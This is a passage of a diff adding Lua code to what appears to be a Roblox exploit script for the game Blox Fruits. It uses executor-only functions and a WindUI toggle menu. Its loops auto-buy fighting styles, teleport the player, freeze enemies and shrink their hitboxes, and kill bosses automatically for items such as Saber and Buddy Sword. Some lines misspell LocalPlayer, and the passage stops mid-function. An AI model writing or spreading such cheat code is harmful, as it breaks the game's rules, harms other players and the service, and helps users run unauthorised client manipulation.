+                            ((game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Dragon Talon")).Level
+                                .Value >= 400 or
+                            (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Dragon Talon") and
+                            ((game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Dragon Talon")).Level
+                                .Value >= 400 then
+                            if string.find((game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(
+                                "BuyGodhuman", true), "Bring") then
+                                WindUI:Notify({
+                                    Title = "Notification",
+                                    Content = "Not Have Enough Material",
+                                    Icon = "bell",
+                                    Duration = 5
+                                });
+                            else
+                                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyGodhuman");
+                            end
+                        end
+                    else
+                        WindUI:Notify({
+                            Title = "Notification",
+                            Content = "Not Have Dragon Talon",
+                            Icon = "bell",
+                            Duration = 5
+                        });
+                    end
+                else
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySuperhuman");
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Items["Auto Dragon Talon"] then
+            if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Dragon Claw") or
+                (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Dragon Claw") or
+                (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Dragon Talon") or
+                (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Dragon Talon") then
+                if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Dragon Claw") and
+                    ((game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Dragon Claw")).Level.Value >= 400 then
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyDragonTalon");
+                    _G.Settings.Main["Selected Weapon"] = "Dragon Talon";
+                end
+                if (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Dragon Claw") and
+                    ((game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Dragon Claw")).Level.Value >=
+                    400 then
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyDragonTalon");
+                    _G.Settings.Main["Selected Weapon"] = "Dragon Talon";
+                end
+                if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Dragon Claw") and
+                    ((game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Dragon Claw")).Level.Value <= 399 then
+                    _G.Settings.Main["Selected Weapon"] = "Dragon Claw";
+                end
+            else
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "2");
+            end
+        end
+    end
+end);
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if _G.Settings.Items["Auto Fishman Karate"] then
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyFishmanKarate");
+                if string.find((game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySharkmanKarate"),
+                    "keys") then
+                    if (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Water Key") or
+                        (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Water Key") then
+                        TweenPlayer(CFrame.new(-2604.6958, 239.432526, -10315.1982, 0.0425701365, 0, -0.999093413, 0, 1,
+                            0, 0.999093413, 0, 0.0425701365));
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySharkmanKarate");
+                    elseif (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Fishman Karate") and
+                        ((game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Fishman Karate")).Level
+                            .Value >= 400 then
+                    else
+                        Ms = "Tide Keeper";
+                        if (game:GetService("Workspace")).Enemies:FindFirstChild(Ms) then
+                            for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                                if v.Name == Ms then
+                                    OldCFrameShark = v.HumanoidRootPart.CFrame;
+                                    repeat
+                                        (game:GetService("RunService")).Heartbeat:wait();
+                                        AutoHaki();
+                                        EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                        v.Humanoid.WalkSpeed = 0;
+                                        v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                        v.HumanoidRootPart.CFrame = OldCFrameShark;
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+                                        Attack();
+                                    until not v.Parent or v.Humanoid.Health <= 0 or
+                                        _G.Settings.Items["Auto Fishman Karate"] == false or
+                                        (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Water Key") or
+                                        (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Water Key");
+                                end
+                            end
+                        else
+                            TweenPlayer(CFrame.new(-3570.18652, 123.328949, -11555.9072, 0.465199202,
+                                -0.000000013857326, 0.885206044, 0.0000000040332897, 1, 0.0000000135347511,
+                                -0.885206044, -0.00000000272606271, 0.465199202));
+                            wait(3);
+                        end
+                    end
+                else
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySharkmanKarate");
+                end
+            end
+        end
+    end);
+end);
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if _G.Settings.Items["Auto Electric Claw"] then
+                if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Electro") or
+                    (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Electro") or
+                    (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Electric Claw") or
+                    (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Electric Claw") then
+                    if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Electro") and
+                        ((game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Electro")).Level.Value >= 400 then
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectricClaw");
+                        _G.Settings.Main["Selected Weapon"] = "Electric Claw";
+                    end
+                    if (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Electro") and
+                        ((game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Electro")).Level.Value >=
+                        400 then
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectricClaw");
+                        _G.Settings.Main["Selected Weapon"] = "Electric Claw";
+                    end
+                    if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Electro") and
+                        ((game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Electro")).Level.Value <= 399 then
+                        _G.Settings.Main["Selected Weapon"] = "Electro";
+                    end
+                else
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectro");
+                end
+            end
+            if _G.Settings.Items["Auto Electric Claw"] then
+                if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Electro") or
+                    (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Electro") then
+                    if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Electro") or
+                        (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Electro") and
+                        ((game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Electro")).Level.Value >= 400 or
+                        ((game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Electro")).Level.Value >=
+                        400 then
+                        if _G.Settings.Main["Auto Farm"] == false then
+                            repeat
+                                (game:GetService("RunService")).Heartbeat:wait();
+                                TweenPlayer(CFrame.new(-10371.4717, 330.764496, -10131.4199));
+                            until not _G.Settings.Items["Auto Electric Claw"] or
+                                ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position -
+                                    (CFrame.new((-10371.4717), 330.764496, (-10131.4199))).Position).Magnitude <= 10;
+                            (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectricClaw",
+                                "Start");
+                            wait(2);
+                            repeat
+                                task.wait();
+                                TweenPlayer(CFrame.new(-12550.532226563, 336.22631835938, -7510.4233398438));
+                            until not _G.Settings.Items["Auto Electric Claw"] or
+                                ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position -
+                                    (CFrame.new((-12550.532226563), 336.22631835938, (-7510.4233398438))).Position).Magnitude <=
+                                10;
+                            wait(1);
+                            repeat
+                                task.wait();
+                                TweenPlayer(CFrame.new(-10371.4717, 330.764496, -10131.4199));
+                            until not _G.Settings.Items["Auto Electric Claw"] or
+                                ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position -
+                                    (CFrame.new((-10371.4717), 330.764496, (-10131.4199))).Position).Magnitude <= 10;
+                            wait(1);
+                            (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectricClaw");
+                        elseif _G.Settings.Main["Auto Farm"] == true then
+                            _G.Settings.Main["Auto Farm"] = false;
+                            wait(1);
+                            repeat
+                                task.wait();
+                                TweenPlayer(CFrame.new(-10371.4717, 330.764496, -10131.4199));
+                            until not _G.Settings.Items["Auto Electric Claw"] or
+                                ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position -
+                                    (CFrame.new((-10371.4717), 330.764496, (-10131.4199))).Position).Magnitude <= 10;
+                            (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectricClaw",
+                                "Start");
+                            wait(2);
+                            repeat
+                                task.wait();
+                                TweenPlayer(CFrame.new(-12550.532226563, 336.22631835938, -7510.4233398438));
+                            until not _G.Settings.Items["Auto Electric Claw"] or
+                                ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position -
+                                    (CFrame.new((-12550.532226563), 336.22631835938, (-7510.4233398438))).Position).Magnitude <=
+                                10;
+                            wait(1);
+                            repeat
+                                task.wait();
+                                TweenPlayer(CFrame.new(-10371.4717, 330.764496, -10131.4199));
+                            until not _G.Settings.Items["Auto Electric Claw"] or
+                                ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position -
+                                    (CFrame.new((-10371.4717), 330.764496, (-10131.4199))).Position).Magnitude <= 10;
+                            wait(1);
+                            (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectricClaw");
+                            _G.Settings.Main["Selected Weapon"] = "Electric Claw";
+                            wait(0.1);
+                            _G.Settings.Main["Auto Farm"] = true;
+                        end
+                    end
+                end
+            end
+        end
+    end);
+end);
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Items["Auto Death Step"] then
+            if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Black Leg") or
+                (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Black Leg") or
+                (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Death Step") or
+                (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Death Step") then
+                if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Black Leg") and
+                    ((game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Black Leg")).Level.Value >= 450 then
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyDeathStep");
+                    _G.Settings.Main["Selected Weapon"] = "Death Step";
+                end
+                if (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Black Leg") and
+                    ((game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Black Leg")).Level.Value >= 450 then
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyDeathStep");
+                    _G.Settings.Main["Selected Weapon"] = "Death Step";
+                end
+                if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Black Leg") and
+                    ((game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Black Leg")).Level.Value <= 449 then
+                    _G.Settings.Main["Selected Weapon"] = "Black Leg";
+                end
+            else
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyBlackLeg");
+            end
+        end
+    end
+end);
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if _G.Settings.Items["Auto Super Human"] then
+                if game.Players.LocalPlayer.Backpack:FindFirstChild("Combat") or
+                    game.Players.LocalPlayer.Character:FindFirstChild("Combat") and
+                    (game:GetService("Players")).LocalPlayer.Data.Beli.Value >= 150000 then
+                    UnEquipWeapon("Combat");
+                    wait(0.1);
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyBlackLeg");
+                end
+                if game.Players.LocalPlayer.Character:FindFirstChild("Superhuman") or
+                    game.Players.LocalPlayer.Backpack:FindFirstChild("Superhuman") then
+                    _G.Settings.Main["Selected Weapon"] = "Superhuman";
+                end
+                if game.Players.LocalPlayer.Backpack:FindFirstChild("Black Leg") or
+                    game.Players.LocalPlayer.Character:FindFirstChild("Black Leg") or
+                    game.Players.LocalPlayer.Backpack:FindFirstChild("Electro") or
+                    game.Players.LocalPlayer.Character:FindFirstChild("Electro") or
+                    game.Players.LocalPlayer.Backpack:FindFirstChild("Fishman Karate") or
+                    game.Players.LocalPlayer.Character:FindFirstChild("Fishman Karate") or
+                    game.Players.LocalPlayer.Backpack:FindFirstChild("Dragon Claw") or
+                    game.Players.LocalPlayer.Character:FindFirstChild("Dragon Claw") then
+                    if game.Players.LocalPlayer.Backpack:FindFirstChild("Black Leg") and
+                        (game.Players.LocalPlayer.Backpack:FindFirstChild("Black Leg")).Level.Value <= 299 then
+                        _G.Settings.Main["Selected Weapon"] = "Black Leg";
+                    end
+                    if game.Players.LocalPlayer.Backpack:FindFirstChild("Electro") and
+                        (game.Players.LocalPlayer.Backpack:FindFirstChild("Electro")).Level.Value <= 299 then
+                        _G.Settings.Main["Selected Weapon"] = "Electro";
+                    end
+                    if game.Players.LocalPlayer.Backpack:FindFirstChild("Fishman Karate") and
+                        (game.Players.LocalPlayer.Backpack:FindFirstChild("Fishman Karate")).Level.Value <= 299 then
+                        _G.Settings.Main["Selected Weapon"] = "Fishman Karate";
+                    end
+                    if game.Players.LocalPlayer.Backpack:FindFirstChild("Dragon Claw") and
+                        (game.Players.LocalPlayer.Backpack:FindFirstChild("Dragon Claw")).Level.Value <= 299 then
+                        _G.Settings.Main["Selected Weapon"] = "Dragon Claw";
+                    end
+                    if game.Players.LocalPlayer.Backpack:FindFirstChild("Black Leg") and
+                        (game.Players.LocalPlayer.Backpack:FindFirstChild("Black Leg")).Level.Value >= 300 and
+                        (game:GetService("Players")).LocalPlayer.Data.Beli.Value >= 300000 then
+                        UnEquipWeapon("Black Leg");
+                        wait(0.1);
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectro");
+                    end
+                    if game.Players.LocalPlayer.Character:FindFirstChild("Black Leg") and
+                        (game.Players.LocalPlayer.Character:FindFirstChild("Black Leg")).Level.Value >= 300 and
+                        (game:GetService("Players")).LocalPlayer.Data.Beli.Value >= 300000 then
+                        UnEquipWeapon("Black Leg");
+                        wait(0.1);
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectro");
+                    end
+                    if game.Players.LocalPlayer.Backpack:FindFirstChild("Electro") and
+                        (game.Players.LocalPlayer.Backpack:FindFirstChild("Electro")).Level.Value >= 300 and
+                        (game:GetService("Players")).LocalPlayer.Data.Beli.Value >= 750000 then
+                        UnEquipWeapon("Electro");
+                        wait(0.1);
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyFishmanKarate");
+                    end
+                    if game.Players.LocalPlayer.Character:FindFirstChild("Electro") and
+                        (game.Players.LocalPlayer.Character:FindFirstChild("Electro")).Level.Value >= 300 and
+                        (game:GetService("Players")).LocalPlayer.Data.Beli.Value >= 750000 then
+                        UnEquipWeapon("Electro");
+                        wait(0.1);
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyFishmanKarate");
+                    end
+                    if game.Players.LocalPlayer.Backpack:FindFirstChild("Fishman Karate") and
+                        (game.Players.LocalPlayer.Backpack:FindFirstChild("Fishman Karate")).Level.Value >= 300 and
+                        (game:GetService("Players")).Localplayer.Data.Fragments.Value >= 1500 then
+                        UnEquipWeapon("Fishman Karate");
+                        wait(0.1);
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward",
+                            "DragonClaw", "1");
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward",
+                            "DragonClaw", "2");
+                    end
+                    if game.Players.LocalPlayer.Character:FindFirstChild("Fishman Karate") and
+                        (game.Players.LocalPlayer.Character:FindFirstChild("Fishman Karate")).Level.Value >= 300 and
+                        (game:GetService("Players")).Localplayer.Data.Fragments.Value >= 1500 then
+                        UnEquipWeapon("Fishman Karate");
+                        wait(0.1);
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward",
+                            "DragonClaw", "1");
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward",
+                            "DragonClaw", "2");
+                    end
+                    if game.Players.LocalPlayer.Backpack:FindFirstChild("Dragon Claw") and
+                        (game.Players.LocalPlayer.Backpack:FindFirstChild("Dragon Claw")).Level.Value >= 300 and
+                        (game:GetService("Players")).LocalPlayer.Data.Beli.Value >= 3000000 then
+                        UnEquipWeapon("Dragon Claw");
+                        wait(0.1);
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySuperhuman");
+                    end
+                    if game.Players.LocalPlayer.Character:FindFirstChild("Dragon Claw") and
+                        (game.Players.LocalPlayer.Character:FindFirstChild("Dragon Claw")).Level.Value >= 300 and
+                        (game:GetService("Players")).LocalPlayer.Data.Beli.Value >= 3000000 then
+                        UnEquipWeapon("Dragon Claw");
+                        wait(0.1);
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySuperhuman");
+                    end
+                end
+            end
+        end
+    end);
+end);
+GunSwordSection = Tabs.ItemsTab:Section({
+    Title = "Gun & Sword",
+    TextXAlignment = "Left"
+});
+AutoGetSaberToggle = Tabs.ItemsTab:Toggle({
+    Title = "Auto Get Saber",
+    Desc = "Function Sea 1 Only",
+    Value = _G.Settings.Items["Auto Saber"],
+    Callback = function(state)
+        _G.Settings.Items["Auto Saber"] = state;
+        StopTween(_G.Settings.Items["Auto Saber"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while task.wait(0.2) do
+        if _G.Settings.Items["Auto Saber"] and World1 and game.Players.LocalPlayer.Data.Level.Value >= 200 then
+            pcall(function()
+                if (game:GetService("Workspace")).Map.Jungle.Final.Part.Transparency == 0 then
+                    if (game:GetService("Workspace")).Map.Jungle.QuestPlates.Door.Transparency == 0 then
+                        if ((CFrame.new((-1612.55884), 36.9774132, 148.719543, 0.37091279, 0.0000000030717151,
+                            (-0.928667724), 0.0000000397099491, 1, 0.0000000191679348, 0.928667724,
+                            (-0.0000000439869794), 0.37091279)).Position -
+                            game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 100 then
+                            TweenPlayer((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame);
+                            wait(1);
+                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
+                                (game:GetService("Workspace")).Map.Jungle.QuestPlates.Plate1.Button.CFrame;
+                            wait(1);
+                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
+                                (game:GetService("Workspace")).Map.Jungle.QuestPlates.Plate2.Button.CFrame;
+                            wait(1);
+                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
+                                (game:GetService("Workspace")).Map.Jungle.QuestPlates.Plate3.Button.CFrame;
+                            wait(1);
+                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
+                                (game:GetService("Workspace")).Map.Jungle.QuestPlates.Plate4.Button.CFrame;
+                            wait(1);
+                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
+                                (game:GetService("Workspace")).Map.Jungle.QuestPlates.Plate5.Button.CFrame;
+                            wait(1);
+                        else
+                            TweenPlayer(CFrame.new(-1612.55884, 36.9774132, 148.719543, 0.37091279, 0.0000000030717151,
+                                -0.928667724, 0.0000000397099491, 1, 0.0000000191679348, 0.928667724,
+                                -0.0000000439869794, 0.37091279));
+                        end
+                    elseif (game:GetService("Workspace")).Map.Desert.Burn.Part.Transparency == 0 then
+                        if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Torch") or
+                            game.Players.LocalPlayer.Character:FindFirstChild("Torch") then
+                            EquipWeapon("Torch");
+                            TweenPlayer(CFrame.new(1114.61475, 5.04679728, 4350.22803, -0.648466587,
+                                -0.00000000128799094, 0.761243105, -0.000000000570652914, 1, 0.00000000120584542,
+                                -0.761243105, 0.000000000347544882, -0.648466587));
+                        else
+                            TweenPlayer(CFrame.new(-1610.00757, 11.5049858, 164.001587, 0.984807551, -0.167722285,
+                                -0.0449818149, 0.17364943, 0.951244235, 0.254912198, 0.0000342372805, -0.258850515,
+                                0.965917408));
+                        end
+                    elseif (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ProQuestProgress",
+                        "SickMan") ~= 0 then
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ProQuestProgress", "GetCup");
+                        wait(0.5);
+                        EquipWeapon("Cup");
+                        wait(0.5);
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ProQuestProgress",
+                            "FillCup", (game:GetService("Players")).LocalPlayer.Character.Cup);
+                        wait(0);
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ProQuestProgress", "SickMan");
+                    elseif (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ProQuestProgress",
+                        "RichSon") == nil then
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon");
+                    elseif (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ProQuestProgress",
+                        "RichSon") == 0 then
+                        if (game:GetService("Workspace")).Enemies:FindFirstChild("Mob Leader") or
+                            (game:GetService("ReplicatedStorage")):FindFirstChild("Mob Leader") then
+                            TweenPlayer(CFrame.new(-2967.59521, -4.91089821, 5328.70703, 0.342208564, -0.0227849055,
+                                0.939347804, 0.0251603816, 0.999569714, 0.0150796166, -0.939287126, 0.0184739735,
+                                0.342634559));
+                            for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                                if v.Name == "Mob Leader" then
+                                    if (game:GetService("Workspace")).Enemies:FindFirstChild(
+                                        "Mob Leader [Lv. 120] [Boss]") then
+                                        if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                            v.Humanoid.Health > 0 then
+                                            repeat
+                                                (game:GetService("RunService")).Heartbeat:wait();
+                                                AutoHaki();
+                                                EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                                v.Humanoid.WalkSpeed = 0;
+                                                v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                                TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                                Attack();
+                                            until v.Humanoid.Health <= 0 or (not _G.Settings.Items["Auto Saber"]);
+                                        end
+                                    end
+                                    if (game:GetService("ReplicatedStorage")):FindFirstChild("Mob Leader") then
+                                        TweenPlayer(
+                                            ((game:GetService("ReplicatedStorage")):FindFirstChild("Mob Leader")).HumanoidRootPart
+                                                .CFrame * Pos);
+                                    end
+                                end
+                            end
+                        end
+                    elseif (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ProQuestProgress",
+                        "RichSon") == 1 then
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon");
+                        wait(0.5);
+                        EquipWeapon("Relic");
+                        wait(0.5);
+                        TweenPlayer(CFrame.new(-1404.91504, 29.9773273, 3.80598116, 0.876514494, 0.00000000566906877,
+                            0.481375456, 0.0000000253851997, 1, -0.0000000579995607, -0.481375456, 0.0000000630572643,
+                            0.876514494));
+                    end
+                elseif (game:GetService("Workspace")).Enemies:FindFirstChild("Saber Expert") or
+                    (game:GetService("ReplicatedStorage")):FindFirstChild("Saber Expert") then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health >
+                            0 then
+                            if v.Name == "Saber Expert" then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    v.HumanoidRootPart.Transparency = 1;
+                                    v.Humanoid.JumpPower = 0;
+                                    v.Humanoid.WalkSpeed = 0;
+                                    PosMon = v.HumanoidRootPart.CFrame;
+                                    MonFarm = v.Name;
+                                    Attack();
+                                until v.Humanoid.Health <= 0 or (not _G.Settings.Items["Auto Saber"]);
+                                if v.Humanoid.Health <= 0 then
+                                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(
+                                        "ProQuestProgress", "PlaceRelic");
+                                end
+                            end
+                        end
+                    end
+                end
+            end);
+        end
+    end
+end);
+AutoBuddySwordToggle = Tabs.ItemsTab:Toggle({
+    Title = "Auto Buddy Sword",
+    Desc = "Function Sea 3 Only",
+    Value = _G.Settings.Items["Auto Buddy Sword"],
+    Callback = function(state)
+        _G.Settings.Items["Auto Buddy Sword"] = state;
+        StopTween(_G.Settings.Items["Auto Buddy Sword"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Items["Auto Buddy Sword"] and World3 then
+            pcall(function()
+                if (game:GetService("Workspace")).Enemies:FindFirstChild("Cake Queen") then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v.Name == "Cake Queen" then
+                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                v.Humanoid.Health > 0 then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    AutoHaki();
+                                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                    v.Humanoid.WalkSpeed = 0;
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    Attack();
+                                until not _G.Settings.Items["Auto Buddy Sword"] or (not v.Parent) or v.Humanoid.Health <=
+                                    0;
+                            end
+                        end
+                    end
+                else
+                    UnEquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                    TweenPlayer(CFrame.new(-731.2034301757812, 381.5658874511719, -11198.4951171875));
+                end
+            end);
+        end
+    end
+end);
+function CheckItemCount(itemName, itemCount)
+    for i, v in next, game.ReplicatedStorage.Remotes.CommF_:InvokeServer("getInventory") do
+        if v.Name == itemName and v.Count >= itemCount then
+            return true;
+        end
+    end
+    return false;
+end
+function DetectChest()
+    local dist = math.huge;
+    local name;
+    for k, v in pairs(game.Workspace:GetChildren()) do
+        if string.match(v.Name, "Chest") then
+            local magnitude = (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude;
+            if magnitude < dist then
+                dist = magnitude;
+                name = v;
+            end
+        end
+    end
+    if not name then
+        for i, v in next, (game:GetService("Workspace")).Map:GetDescendants() do
+            if v:IsA("Part") and string.find(v.Name, "Chest") then
+                local magnitude = (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude;
+                if magnitude < dist then
+                    dist = magnitude;
+                    name = v;
+                end
+            end
+        end
+    end
+    return name;
+end
+local MobBlacklist = {};
+function DetectPartSpawnMob(name)
+    local name1;
+    if string.find(name, "Lv.") then
+        name1 = name:gsub(" %pLv. %d+%p", "");
+    end
+    for i, v in pairs((game:GetService("Workspace"))._WorldOrigin.EnemySpawns:GetChildren()) do
+        local stringgsub;
+        if string.find(v.Name, "Lv.") then
+            stringgsub = v.Name:gsub(" %pLv. %d+%p", "");
+        end
+        if v:IsA("Part") and (stringgsub and stringgsub == name or name == v.Name or name1 and v.Name == name1) then
+            return v;
+        end
+    end
+    for i, v in pairs(getnilinstances()) do
+        local stringgsub;
+        if string.find(v.Name, "Lv.") then
+            stringgsub = v.Name:gsub(" %pLv. %d+%p", "");
+        end
+        if v:IsA("Part") and (stringgsub and stringgsub == name or name == v.Name or name1 and v.Name == name1) then
+            return v;
+        end
+    end
+end
+function TeleportSpawnMob(Path, value)
+    if typeof(Path) == "table" then
+        if #MobBlacklist >= 4 then
+            MobBlacklist = {};
+            return;
+        end
+        local GetPart;
+        for i, v in next, Path do
+            if not table.find(MobBlacklist, v) then
+                GetPart = DetectPartSpawnMob(v);
+                repeat
+                    task.wait();
+                    TweenPlayer(GetPart.CFrame * CFrame.new(0, 60, 0));
+                until (GetPart.Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 100 or DetectMob(Path) or
+                    (not value);
+            end
+        end
+    else
+        GetPart = DetectPartSpawnMob(Path);
+        TweenPlayer(GetPart.CFrame * CFrame.new(0, 60, 0));
+    end
+end
+function DetectMob(c)
+    local dist = math.huge;
+    local name;
+    for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
+        local stringgsub = v.Name:gsub(" %pLv. %d+%p", "");
+        if (typeof(c) == "table" and (table.find(c, v.Name) or table.find(c, stringgsub)) or
+            (v.Name == c or c == stringgsub)) and v:IsA("Model") and v:FindFirstChild("Humanoid") and v.Humanoid.Health >
+            0 and v:FindFirstChild("HumanoidRootPart") then
+            local magnitude = (v.HumanoidRootPart.Position -
+                                  (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).magnitude;
+            if magnitude < dist then
+                dist = magnitude;
+                name = v;
+            end
+        end
+    end
+    return name;
+end
+function DetectRequestSoulGuitar()
+    local Mob = {};
+    local PlaceId;
+    local NameRemote;
+    if not CheckItemCount("Ectoplasm", 250) then
